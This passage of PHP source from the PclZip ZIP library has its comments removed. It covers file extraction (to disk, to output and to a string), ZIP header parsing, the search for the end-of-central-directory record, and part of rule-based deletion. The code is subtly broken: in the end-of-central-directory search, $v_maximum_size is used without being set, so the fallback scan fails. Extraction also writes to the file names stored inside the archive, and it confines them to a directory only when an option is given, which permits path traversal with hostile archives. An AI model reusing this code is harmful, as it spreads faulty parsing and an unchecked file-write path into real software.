            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);

  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
